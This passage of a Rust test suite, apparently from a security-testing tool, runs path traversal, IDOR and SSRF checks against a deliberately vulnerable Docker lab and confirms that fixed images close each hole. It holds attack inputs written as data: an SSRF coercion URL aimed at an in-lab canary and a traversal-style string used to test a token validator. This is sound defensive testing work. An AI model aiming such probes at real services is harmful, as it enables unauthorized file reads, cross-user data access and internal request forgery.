                    "skipping path_traversal_check_flags_the_playground: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("api", "redstep/api:mvp", "lab")
                .service("db", "redstep/db:mvp", "lab")
                .build()
                .expect("the flat api+db environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the playground (readiness-gated)");
            let vantage = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();

            let scope = Scope::from_environment(&env);
            let target = scope.resolve("api:8081").expect("api is in scope");
            let exploit_path = format!("/file?path={PATH_TRAVERSAL_PAYLOAD}");

            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage);
            let recorded = ctx
                .exploit_path_traversal_from_vantage(&target, &exploit_path, PATH_TRAVERSAL_WITNESS)
                .await
                .expect("the vantage traversal probe ran");
            let observed = recorded.observation.value;
            let confidence = recorded.observation.confidence;
            let verdict = ctx.expect(&recorded).to_be(false);

            // A benign in-root path does not carry the sentinel: the differential is
            // real, not a probe that reads anything as a hit.
            let benign_path = format!("/file?path={BENIGN_FILE_PATH}");
            let control = ctx
                .exploit_path_traversal_from_vantage(&target, &benign_path, PATH_TRAVERSAL_WITNESS)
                .await
                .expect("the benign traversal control ran");

            let judgements = ctx.take_judgements();
            let drafts = ctx.take_evidence_drafts();
            let _ = lab.teardown().await;

            assert_eq!(
                verdict,
                crate::Verdict::Fail,
                "the vulnerable playground is a security FAIL"
            );
            assert!(
                observed,
                "the traversal read the sentinel outside the web root"
            );
            assert!(
                !control.observation.value,
                "a benign in-root path never carries the sentinel: the differential is real"
            );
            assert!(
                control.diagnostic.is_none(),
                "a non-exploit (the benign control) carries no diagnostic: the ADR-0009 cause is attached only to a real traversal, not a clean result"
            );
            let (judgement, _) = &judgements[0];
            assert_eq!(judgement.verdict, crate::Verdict::Fail);
            let diagnostic = judgement
                .diagnostic
                .as_ref()
                .expect("a FAIL carries a diagnostic");
            assert!(
                diagnostic.probable_cause.contains(PATH_TRAVERSAL_WITNESS)
                    && diagnostic.probable_cause.contains("intended directory"),
                "the domain cause names the sentinel and the intended directory, not generic text: {:?}",
                diagnostic.probable_cause
            );
            assert!(
                diagnostic.remediation.contains("canonicalize"),
                "the domain remediation names canonicalizing the path: {:?}",
                diagnostic.remediation
            );
            // RK-011: the evidence draft mirrors the observation, and is tagged as
            // the traversal capability, so the record is not a faithful-looking
            // projection of a constant nor mislabelled as the SQLi check.
            assert_eq!(drafts[0].capability, "http_path_traversal_vantage");
            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
            assert_eq!(drafts[0].confidence, confidence);
            assert_eq!(
                drafts[0].source,
                Some(NodeRef::Vantage {
                    segment: "lab".to_owned()
                })
            );
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images,
    /// including `redstep/api:fixed`): the path-traversal attack-to-defense loop
    /// closes (#63 AC 2), parallel to `sqli_fix_and_replay_closes_the_loop`. A
    /// genuine traversal is recorded against the vulnerable api, and its own success
    /// witness (the reproduction the seam emits) is replayed against two fresh labs:
    /// it reproduces the read against the vulnerable image and is not-exploitable,
    /// and confidently so (a clean negative, not an abnormal `Low`), against the
    /// canonicalizing `redstep/api:fixed`. The #63 check then verdicts `Pass`
    /// against that fixed lab. The vulnerable and fixed labs differ only in the api
    /// image, so the difference is the fix.
    ///
    /// A positive control probes a benign in-root file on the fixed lab and requires
    /// its body back; it is what distinguishes a working `/file` from a "fix" that
    /// served nothing for every path, which would satisfy "the traversal is closed"
    /// just as well (RK-016). Taking the witness from the recorder round-trips it
    /// through `parse_http_witness`, so a replay that rejected what the seam writes
    /// would `Err`.
    ///
    /// Mutation: revert the api `serve_file` to the raw join -> the replay observes
    /// `true` and the fixed-lab check `Fail`s -> this fails. Make the `fixed`
    /// `serve_file` return an empty body for every path -> `benign.value` is `false`
    /// -> this fails (the gap the positive control closes).
    #[test]
    fn path_traversal_fix_and_replay_closes_the_loop() {
        if !linux_docker_available() {
            eprintln!(
                "skipping path_traversal_fix_and_replay_closes_the_loop: no Linux Docker daemon"
            );
            return;
        }
        for image in ["redstep/api:mvp", "redstep/api:fixed", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping path_traversal_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let flat = |api_image: &str| {
                Environment::builder()
                    .segment("lab")
                    .vantage("lab")
                    .service("api", api_image, "lab")
                    .service("db", "redstep/db:mvp", "lab")
                    .build()
                    .expect("the flat api+db environment is valid")
            };
            let vuln_env = flat("redstep/api:mvp");
            let fixed_env = flat("redstep/api:fixed");
            let exploit_path = format!("/file?path={PATH_TRAVERSAL_PAYLOAD}");

            // Record a genuine traversal against the vulnerable lab and take ITS
            // witness (the reproduction the seam emits), so replaying round-trips the
            // recorder's own output through `parse_http_witness`.
            let vuln_lab = bring_up(&docker, &vuln_env)
                .await
                .expect("bring up the vulnerable playground");
            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
            let vuln_scope = Scope::from_environment(&vuln_env);
            let vuln_target = vuln_scope.resolve("api:8081").expect("api is in scope");
            let (recorded_vuln, draft) = http_witness_exploit_from(
                &docker,
                vuln_net,
                &vuln_target,
                "http_path_traversal_vantage",
                &exploit_path,
                PATH_TRAVERSAL_WITNESS,
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the recording traversal ran");
            vuln_lab
                .teardown()
                .await
                .expect("teardown after recording the witness");
            let witness = draft.reproduction;

            let on_vuln = replay_http_witness_probe(&docker, &vuln_env, &witness)
                .await
                .expect("replay against the vulnerable lab ran");
            let on_fixed = replay_http_witness_probe(&docker, &fixed_env, &witness)
                .await
                .expect("replay against the fixed lab ran");

            // The fixed lab once more, for two checks on one bring-up: a positive
            // control, then the #63 check's Pass.
            let fixed_lab = bring_up(&docker, &fixed_env)
                .await
                .expect("bring up the fixed playground");
            let net = fixed_lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let scope = Scope::from_environment(&fixed_env);
            let target = scope.resolve("api:8081").expect("api is in scope");

            // Positive control: a benign in-root file still serves its body, so the
            // fix is a working `/file` and not an endpoint that serves nothing (which
            // would also show the traversal closed). The benign body is the marker.
            let benign_path = format!("/file?path={BENIGN_FILE_PATH}");
            let (benign, _) = http_witness_exploit_from(
                &docker,
                &net,
                &target,
                "http_path_traversal_vantage",
                &benign_path,
                BENIGN_FILE_BODY,
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the benign file read ran");

            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), net);
            let recorded = ctx
                .exploit_path_traversal_from_vantage(&target, &exploit_path, PATH_TRAVERSAL_WITNESS)
                .await
                .expect("the fixed-lab check ran");
            let verdict = ctx.expect(&recorded).to_be(false);
            let _ = fixed_lab.teardown().await;

            assert!(
                recorded_vuln.value,
                "the recording genuinely traverses the vulnerable lab"
            );
            assert!(
                on_vuln.value,
                "the witness replays as exploited against a fresh vulnerable lab"
            );
            assert!(
                !on_fixed.value,
                "the fix closes it: the same witness is not-exploitable against the fixed lab"
            );
            assert_eq!(
                on_fixed.confidence,
                Confidence::High,
                "the fixed not-exploitable is a confident clean, not an abnormal Low"
            );
            assert!(
                benign.value,
                "positive control: the fixed /file still serves a legitimate in-root file, so the fix is a working endpoint and not one that serves nothing"
            );
            assert_eq!(
                benign.confidence,
                Confidence::High,
                "the benign read is a confident read, not an abnormal probe"
            );
            assert_eq!(
                verdict,
                crate::Verdict::Pass,
                "the #63 check passes against the fixed lab"
            );
        });
    }

    /// Guard: a vantage probe recorded against the MVP lab replays from its
    /// witness through the full pipeline (parse, bring-up, resolve, probe,
    /// teardown) and agrees with the recording that `db` is unreachable from the
    /// `internet` vantage (ADR-0022, #29). The witness is produced by the real
    /// recorder, not hand-assembled. The name says "agrees on an unreachable
    /// target", not "reproduces an observation": an all-unreachable MVP lab
    /// cannot distinguish a reproduced `false` from a hard-coded one, so this
    /// proves the pipeline runs end to end and does not disagree, while the
    /// segment-selection and witness-shape mutations are carried by the offline
    /// guards above. Mutation: break `parse_vantage_witness` so it rejects the
    /// recorded witness, or `vantage_network` so the `internet` segment is not
    /// found -> `replay` returns `Err` -> the `expect` panics -> this fails.
    /// Docker-gated, self-skipping. RK-010: it asserts the reproduced
    /// observation, not a global Docker object count.
    #[test]
    fn replay_vantage_probe_agrees_with_the_recording_on_an_unreachable_target() {
        if !linux_docker_available() {
            eprintln!(
                "skipping replay_vantage_probe_agrees_with_the_recording_on_an_unreachable_target: no Linux Docker daemon"
            );
            return;
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("internal")
                .segment("internet")
                .standin("db", PROBE_IMAGE, "internal")
                .vantage("internet")
                .boundary("internet", "internal", &[])
                .build()
                .expect("a valid environment");

            // Record a real vantage probe: db is unreachable from the internet
            // vantage (cross-segment, and the stand-in does not listen).
            let lab = bring_up(&docker, &env).await.expect("bring up the lab");
            let internet = vantage_network(&lab, "internet").expect("the internet network");
            let scoped = Scope::from_environment(&env)
                .resolve("db:5432")
                .expect("db is in scope");
            let (recorded, draft) =
                tcp_reachable_from(&docker, internet, &scoped, Duration::from_secs(2))
                    .await
                    .expect("the probe ran");
            lab.teardown().await.expect("teardown after recording");

            // Replay from the recorded witness and check it reproduces.
            let replayed = replay_vantage_probe(&docker, &env, &draft.reproduction)
                .await
                .expect("replay from the witness runs");
            assert_eq!(
                replayed.value, recorded.value,
                "replaying the witness reproduces the recorded observation"
            );
            assert_eq!(replayed.confidence, recorded.confidence);
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// native IDOR check verdicts `Fail` against the vulnerable playground api and
    /// the `Fail` carries the ADR-0009 IDOR diagnostic (#64 AC 1). alice (her token
    /// in the `Authorization` header) requesting bob's object id witnesses bob's
    /// marker; alice requesting her OWN object does not, so the differential is real
    /// rather than a constant-true probe. Mutation: add the ownership check to the
    /// api `serve_object` (the fix) -> alice no longer reads bob's object -> the
    /// verdict assertion fails; change the diagnostic gate from
    /// `observation.value.then(..)` to `Some(..)` in `exploit_idor_from_vantage` ->
    /// the control carries a diagnostic -> the `control.diagnostic.is_none()` fails.
    /// The draft-mirrors-observation check is RK-011.
    #[test]
    fn idor_check_flags_the_playground() {
        if !linux_docker_available() {
            eprintln!("skipping idor_check_flags_the_playground: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/api:mvp", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping idor_check_flags_the_playground: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("api", "redstep/api:mvp", "lab")
                .service("db", "redstep/db:mvp", "lab")
                .build()
                .expect("the flat api+db environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the playground (readiness-gated)");
            let vantage = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();

            let scope = Scope::from_environment(&env);
            let target = scope.resolve("api:8081").expect("api is in scope");
            let alice_auth = [("Authorization".to_owned(), IDOR_ALICE_TOKEN.to_owned())];

            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage);
            let recorded = ctx
                .exploit_idor_from_vantage(&target, IDOR_VICTIM_OBJECT, IDOR_WITNESS, &alice_auth)
                .await
                .expect("the vantage IDOR probe ran");
            let observed = recorded.observation.value;
            let confidence = recorded.observation.confidence;
            let verdict = ctx.expect(&recorded).to_be(false);

            // alice reading her OWN object does not carry bob's marker: the
            // differential is real, not a probe that reads anything as a hit.
            let control = ctx
                .exploit_idor_from_vantage(&target, IDOR_OWN_OBJECT, IDOR_WITNESS, &alice_auth)
                .await
                .expect("the own-object control ran");

            let judgements = ctx.take_judgements();
            let drafts = ctx.take_evidence_drafts();
            let _ = lab.teardown().await;

            assert_eq!(
                verdict,
                crate::Verdict::Fail,
                "the vulnerable playground is a security FAIL"
            );
            assert!(
                observed,
                "alice read bob's object across the ownership boundary"
            );
            assert!(
                !control.observation.value,
                "alice reading her own object never carries bob's marker: the differential is real"
            );
            assert!(
                control.diagnostic.is_none(),
                "a non-exploit (the own-object control) carries no diagnostic: the ADR-0009 cause is attached only to a real IDOR, not a clean result"
            );
            let (judgement, _) = &judgements[0];
            assert_eq!(judgement.verdict, crate::Verdict::Fail);
            let diagnostic = judgement
                .diagnostic
                .as_ref()
                .expect("a FAIL carries a diagnostic");
            assert!(
                diagnostic.probable_cause.contains(IDOR_WITNESS)
                    && diagnostic.probable_cause.contains("another user"),
                "the domain cause names the marker and that it is another user's data: {:?}",
                diagnostic.probable_cause
            );
            assert!(
                diagnostic.remediation.contains("authorization"),
                "the domain remediation names the authorization check: {:?}",
                diagnostic.remediation
            );
            // RK-011: the evidence draft mirrors the observation and is tagged as the
            // IDOR capability, not a faithful-looking projection of a constant nor
            // mislabelled as another technique.
            assert_eq!(drafts[0].capability, "http_idor_vantage");
            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
            assert_eq!(drafts[0].confidence, confidence);
            assert_eq!(
                drafts[0].source,
                Some(NodeRef::Vantage {
                    segment: "lab".to_owned()
                })
            );
        });
    }

    /// Guard (Docker; self-skips without a daemon or the built images including
    /// `redstep/api:fixed`): the IDOR attack-to-defense loop closes (#64 AC 2),
    /// parallel to the SQLi and traversal loops. alice-reads-bob is recorded against
    /// the vulnerable api and its own witness (the identity header included) replays
    /// as exploited on a fresh vulnerable lab and not-exploitable, confidently so,
    /// against the ownership-checking `redstep/api:fixed`. The #64 check then verdicts
    /// `Pass` against the fixed lab. The labs differ only in the api image, so the
    /// difference is the fix.
    ///
    /// A positive control probes alice's OWN object on the fixed lab and requires her
    /// body back; it distinguishes a working endpoint from a "fix" that denied every
    /// request (which would satisfy "the IDOR is closed" just as well, RK-016).
    /// Taking the witness from the recorder round-trips it through
    /// `parse_http_witness`, identity headers included, so a replay that rejected
    /// what the seam writes would `Err`.
    ///
    /// Mutation: revert the api `serve_object` to the no-ownership-check form -> the
    /// replay observes `true` and the fixed-lab check `Fail`s -> this fails. Make the
    /// `fixed` `serve_object` deny everyone (serve no body) -> `benign.value` is
    /// `false` -> this fails (the gap the positive control closes).
    #[test]
    fn idor_fix_and_replay_closes_the_loop() {
        if !linux_docker_available() {
            eprintln!("skipping idor_fix_and_replay_closes_the_loop: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/api:mvp", "redstep/api:fixed", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping idor_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let flat = |api_image: &str| {
                Environment::builder()
                    .segment("lab")
                    .vantage("lab")
                    .service("api", api_image, "lab")
                    .service("db", "redstep/db:mvp", "lab")
                    .build()
                    .expect("the flat api+db environment is valid")
            };
            let vuln_env = flat("redstep/api:mvp");
            let fixed_env = flat("redstep/api:fixed");
            let alice_auth = [("Authorization".to_owned(), IDOR_ALICE_TOKEN.to_owned())];

            // Record a genuine IDOR against the vulnerable lab and take ITS witness,
            // so replaying round-trips the recorder's own output (identity headers
            // included) through `parse_http_witness`.
            let vuln_lab = bring_up(&docker, &vuln_env)
                .await
                .expect("bring up the vulnerable playground");
            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
            let vuln_scope = Scope::from_environment(&vuln_env);
            let vuln_target = vuln_scope.resolve("api:8081").expect("api is in scope");
            let (recorded_vuln, draft) = http_witness_exploit_from(
                &docker,
                vuln_net,
                &vuln_target,
                "http_idor_vantage",
                IDOR_VICTIM_OBJECT,
                IDOR_WITNESS,
                &alice_auth,
                Duration::from_millis(5_000),
            )
            .await
            .expect("the recording IDOR ran");
            vuln_lab
                .teardown()
                .await
                .expect("teardown after recording the witness");
            let witness = draft.reproduction;

            let on_vuln = replay_http_witness_probe(&docker, &vuln_env, &witness)
                .await
                .expect("replay against the vulnerable lab ran");
            let on_fixed = replay_http_witness_probe(&docker, &fixed_env, &witness)
                .await
                .expect("replay against the fixed lab ran");

            // The fixed lab once more, for two checks on one bring-up: a positive
            // control, then the #64 check's Pass.
            let fixed_lab = bring_up(&docker, &fixed_env)
                .await
                .expect("bring up the fixed playground");
            let net = fixed_lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let scope = Scope::from_environment(&fixed_env);
            let target = scope.resolve("api:8081").expect("api is in scope");

            // Positive control: alice reads her OWN object on the fixed lab and gets
            // her body back, so the fix is a working endpoint and not one that denies
            // everyone. Her own body is the marker.
            let (benign, _) = http_witness_exploit_from(
                &docker,
                &net,
                &target,
                "http_idor_vantage",
                IDOR_OWN_OBJECT,
                IDOR_OWN_BODY,
                &alice_auth,
                Duration::from_millis(5_000),
            )
            .await
            .expect("the own-object read ran");

            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), net);
            let recorded = ctx
                .exploit_idor_from_vantage(&target, IDOR_VICTIM_OBJECT, IDOR_WITNESS, &alice_auth)
                .await
                .expect("the fixed-lab check ran");
            let verdict = ctx.expect(&recorded).to_be(false);
            let _ = fixed_lab.teardown().await;

            assert!(
                recorded_vuln.value,
                "the recording genuinely reads bob's object across the ownership boundary"
            );
            assert!(
                on_vuln.value,
                "the witness replays as exploited against a fresh vulnerable lab"
            );
            assert!(
                !on_fixed.value,
                "the fix closes it: the same witness is not-exploitable against the fixed lab"
            );
            assert_eq!(
                on_fixed.confidence,
                Confidence::High,
                "the fixed not-exploitable is a confident clean, not an abnormal Low"
            );
            assert!(
                benign.value,
                "positive control: alice still reads her own object on the fixed lab, so the fix is a working endpoint and not one that denies everyone"
            );
            assert_eq!(
                benign.confidence,
                Confidence::High,
                "the own-object read is a confident read, not an abnormal probe"
            );
            assert_eq!(
                verdict,
                crate::Verdict::Pass,
                "the #64 check passes against the fixed lab"
            );
        });
    }

    const SSRF_CANARY_ALIAS: &str = "canary";
    const SSRF_CANARY_PORT: u16 = 8082;
    const SSRF_TOKEN: &str = "redstep-ssrf-witness-7e1a";
    const SSRF_CONTROL_TOKEN: &str = "redstep-ssrf-control-9f2b";

    /// Guard: `classify_ssrf` maps the out-of-band signal fail-closed. A clean probe
    /// exit with the token seen at the canary is exploited/High; a clean exit with
    /// it absent is not-exploitable/High; an abnormal exit (the coercion did not
    /// complete) is Low even if the token was seen, because the probe did not
    /// establish the target's behaviour (RK-002). Pure, no Docker. Mutation: give
    /// the abnormal arm `High` -> the abnormal case fails.
    #[test]
    fn classify_ssrf_reads_the_canary_and_fails_closed() {
        use bollard::models::ContainerStateStatusEnum::EXITED;
        let state = |status, code| ContainerState {
            status,
            exit_code: code,
            ..Default::default()
        };
        let seen = classify_ssrf(&state(Some(EXITED), Some(0)), true, false);
        assert!(seen.value);
        assert_eq!(seen.confidence, Confidence::High);

        let clean = classify_ssrf(&state(Some(EXITED), Some(0)), false, false);
        assert!(!clean.value);
        assert_eq!(clean.confidence, Confidence::High);

        let abnormal = classify_ssrf(&state(Some(EXITED), Some(1)), true, false);
        assert!(!abnormal.value);
        assert_eq!(abnormal.confidence, Confidence::Low);

        // A followed redirect is Low even on a clean exit with the token seen: the
        // probe may not have reached the app's /fetch, so the coercion may not have
        // fired. Mutation: drop the `redirected` short-circuit in classify_ssrf ->
        // this reads true/High -> fails.
        let redirected = classify_ssrf(&state(Some(EXITED), Some(0)), true, true);
        assert!(!redirected.value);
        assert_eq!(redirected.confidence, Confidence::Low);
    }

    /// Guard: `validate_ssrf_token` fails closed on a token that is empty, too
    /// short, or not URL-safe. An empty token would make the canary-log `contains`
    /// check vacuously true (a forged witness). Mutation: drop the length check or
    /// the char check in `validate_ssrf_token` -> the matching case passes -> this
    /// fails.
    #[test]
    fn validate_ssrf_token_fails_closed() {
        assert!(validate_ssrf_token("redstep-ssrf-witness-7e1a").is_ok());
        assert!(validate_ssrf_token("ssrf-redstep-1a2b-3").is_ok());
        assert!(
            validate_ssrf_token("").is_err(),
            "an empty token is refused"
        );
        assert!(
            validate_ssrf_token("short").is_err(),
            "a sub-8-char token is refused"
        );
        assert!(
            validate_ssrf_token("has space 1234").is_err(),
            "a non-URL-safe token is refused"
        );
        assert!(
            validate_ssrf_token("tok/../../x").is_err(),
            "a path-traversal-ish token is refused ('/' is not unreserved)"
        );
    }

    /// Guard: the SSRF draft attributes the witness to the coerced app (`target`),
    /// not the canary (the observation point): the canary lives only in the
    /// reproduction params (#65, ADR-0023, AC3). Pure, no Docker. Mutation: set the
    /// draft's `target` to the canary alias -> the `target` assertion fails.
    #[test]
    fn ssrf_draft_attributes_the_witness_to_the_target_not_the_canary() {
        let observation = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let draft = ssrf_draft(
            "lab",
            "api:8081".to_owned(),
            "/fetch?url=http://canary:8082/tok",
            "tok",
            "canary",
            8082,
            &observation,
            Duration::from_millis(5_000),
        );
        assert_eq!(
            draft.target, "api:8081",
            "the finding is attributed to the app"
        );
        assert_eq!(draft.reproduction.target, "api:8081");
        assert_eq!(
            draft.source,
            Some(NodeRef::Vantage {
                segment: "lab".to_owned()
            })
        );
        // The canary is only a reproduction param, never the target or source.
        assert_eq!(draft.reproduction.params["canary_alias"], "canary");
        assert_eq!(draft.reproduction.params["canary_port"], 8082);
        assert_eq!(draft.capability, "http_ssrf_vantage");
        assert_eq!(draft.observed, serde_json::Value::Bool(true));
        assert_eq!(draft.confidence, Confidence::High);
        assert!(
            draft.summary.contains("the SSRF succeeded") && draft.summary.contains("tok"),
            "the summary names the token and the success: {:?}",
            draft.summary
        );
    }

    /// Guard: an SSRF witness round-trips through `parse_ssrf_witness`, and a
    /// witness missing any field (or carrying a non-SSRF capability) is rejected
    /// fail-closed (ADR-0022). Pure, no Docker. Mutation: drop a field's check ->
    /// the matching `rejected` case parses -> fails.
    #[test]
    fn parse_ssrf_witness_round_trips_and_rejects_an_incomplete_witness() {
        let observation = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let draft = ssrf_draft(
            "lab",
            "api:8081".to_owned(),
            "/fetch?url=http://canary:8082/tok",
            "tok",
            "canary",
            8082,
            &observation,
            Duration::from_millis(5_000),
        );
        let (segment, target, request_path, token, alias, port, timeout) =
            parse_ssrf_witness(&draft.reproduction).expect("a complete SSRF witness parses");
        assert_eq!(segment, "lab");
        assert_eq!(target, "api:8081");
        assert_eq!(request_path, "/fetch?url=http://canary:8082/tok");
        assert_eq!(token, "tok");
        assert_eq!(alias, "canary");
        assert_eq!(port, 8082);
        assert_eq!(timeout, Duration::from_millis(5_000));

        let without = |key: &str| {
            let mut params = draft.reproduction.params.clone();
            params.as_object_mut().unwrap().remove(key);
            Reproduction {
                capability: HTTP_SSRF_VANTAGE.to_owned(),
                target: "api:8081".to_owned(),
                params,
            }
        };
        assert!(
            parse_ssrf_witness(&without("token")).is_err(),
            "a witness with no token is rejected"
        );
        assert!(
            parse_ssrf_witness(&without("canary_alias")).is_err(),
            "a witness with no canary_alias is rejected"
        );
        assert!(
            parse_ssrf_witness(&without("canary_port")).is_err(),
            "a witness with no canary_port is rejected"
        );
        assert!(
            parse_ssrf_witness(&without("vantage_segment")).is_err(),
            "a witness with no vantage_segment is rejected"
        );
        let not_ssrf = Reproduction {
            capability: HTTP_SQLI_VANTAGE.to_owned(),
            target: "api:8081".to_owned(),
            params: draft.reproduction.params.clone(),
        };
        assert!(
            parse_ssrf_witness(&not_ssrf).is_err(),
            "a non-SSRF witness is rejected"
        );
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// native SSRF check verdicts `Fail` against the vulnerable playground, with
    /// the ADR-0009 SSRF diagnostic, and the witness is OUT-OF-BAND (#65 AC1/AC3).
    /// The attacker coerces the api to fetch the in-lab canary; the canary records
    /// the token; the api's OWN response never carries it. A positive control (a
    /// direct vantage->canary hit) proves the canary witnesses on this lab. RK-011:
    /// the draft mirrors the observation, is tagged `http_ssrf_vantage`, and is
    /// attributed to the app (`target`), not the canary. Mutation: have the api
    /// `serve_fetch` refuse the internal host (the fix) -> the canary is not reached
    /// -> the verdict assertion fails.
    #[test]
    fn ssrf_check_flags_the_playground() {
        if !linux_docker_available() {
            eprintln!("skipping ssrf_check_flags_the_playground: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/api:mvp", "redstep/db:mvp", "redstep/canary:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping ssrf_check_flags_the_playground: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("api", "redstep/api:mvp", "lab")
                .service("db", "redstep/db:mvp", "lab")
                .service("canary", "redstep/canary:mvp", "lab")
                .build()
                .expect("the api+db+canary environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the playground (readiness-gated)");
            let vantage = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let canary_container = lab
                .containers()
                .iter()
                .find(|c| c.workload() == "canary")
                .map(|c| c.name().to_owned())
                .expect("the canary container");

            let scope = Scope::from_environment(&env);
            let target = scope.resolve("api:8081").expect("api is in scope");

            let ctx =
                crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage.clone());
            let recorded = ctx
                .exploit_ssrf_from_vantage(
                    &target,
                    SSRF_CANARY_ALIAS,
                    SSRF_CANARY_PORT,
                    &canary_container,
                )
                .await
                .expect("the vantage SSRF probe ran");
            let observed = recorded.observation.value;
            let confidence = recorded.observation.confidence;
            let verdict = ctx.expect(&recorded).to_be(false);

            // AC1: the api's OWN response never carries the token. The witness is at
            // the canary; the body alone would not reveal the SSRF.
            let coerce =
                format!("/fetch?url=http://{SSRF_CANARY_ALIAS}:{SSRF_CANARY_PORT}/{SSRF_TOKEN}");
            let api_url = format!("http://{}:{}{}", target.host(), target.port(), coerce);
            let (_s, api_body, _h) = run_probe_capturing(
                &docker,
                vantage.name(),
                wget_cmd(&api_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the api /fetch probe ran");

            // Positive control: a direct vantage->canary hit is recorded, so the
            // canary witnesses on this lab (an absent token means not reached, not a
            // dead canary).
            let control_url =
                format!("http://{SSRF_CANARY_ALIAS}:{SSRF_CANARY_PORT}/{SSRF_CONTROL_TOKEN}");
            let _ = run_probe_capturing(
                &docker,
                vantage.name(),
                wget_cmd(&control_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the direct canary probe ran");
            let (canary_out, _canary_err) = read_container_logs(&docker, &canary_container)
                .await
                .expect("read the canary logs");

            let judgements = ctx.take_judgements();
            let drafts = ctx.take_evidence_drafts();
            let _ = lab.teardown().await;

            assert_eq!(
                verdict,
                crate::Verdict::Fail,
                "the vulnerable playground is a security FAIL"
            );
            assert!(
                observed,
                "the target reached the canary (out-of-band witness)"
            );
            assert!(
                !api_body.contains(SSRF_TOKEN),
                "the api's own response does not carry the token: the body alone would not show the SSRF (AC1): {api_body:?}"
            );
            assert!(
                canary_out.contains(SSRF_CONTROL_TOKEN),
                "positive control: a direct hit is recorded, so the canary witnesses on this lab"
            );
            let (judgement, _) = &judgements[0];
            assert_eq!(judgement.verdict, crate::Verdict::Fail);
            let diagnostic = judgement
                .diagnostic
                .as_ref()
                .expect("a FAIL carries a diagnostic");
            assert!(
                diagnostic.probable_cause.contains(SSRF_CANARY_ALIAS)
                    && diagnostic.probable_cause.contains("SSRF"),
                "the domain cause names the internal host and the technique: {:?}",
                diagnostic.probable_cause
            );
            assert!(
                diagnostic.remediation.contains("allowlist"),
                "the domain remediation names the allowlist fix: {:?}",
                diagnostic.remediation
            );
            // RK-011 + AC3.
            assert_eq!(drafts[0].capability, "http_ssrf_vantage");
            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
            assert_eq!(drafts[0].confidence, confidence);
            assert_eq!(
                drafts[0].target, "api:8081",
                "the witness is attributed to the app, not the canary"
            );
            assert_eq!(
                drafts[0].source,
                Some(NodeRef::Vantage {
                    segment: "lab".to_owned()
                })
            );
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images,
    /// including `redstep/api:fixed`): the SSRF attack-to-defense loop closes (#65
    /// AC2), parallel to the SQLi/IDOR loops. A genuine coercion is recorded against
    /// the vulnerable api and its own witness is replayed against two fresh labs: it
    /// reproduces the callback against the vulnerable image and is not-exploitable,
    /// confidently, against the allowlisting `redstep/api:fixed`. A positive control
    /// (a direct canary hit on the fixed lab) proves the canary still records, so
    /// "not seen" is the fix holding, not the canary down (RK-016). Mutation: revert
    /// the api `serve_fetch` allowlist fix -> the app reaches the canary again ->
    /// `on_fixed.value` is true -> this fails.
    #[test]
    fn ssrf_fix_and_replay_closes_the_loop() {
        if !linux_docker_available() {
            eprintln!("skipping ssrf_fix_and_replay_closes_the_loop: no Linux Docker daemon");
            return;
        }
        for image in [
            "redstep/api:mvp",
            "redstep/api:fixed",
            "redstep/db:mvp",
            "redstep/canary:mvp",
        ] {
            if !image_present(image) {
                eprintln!(
                    "skipping ssrf_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
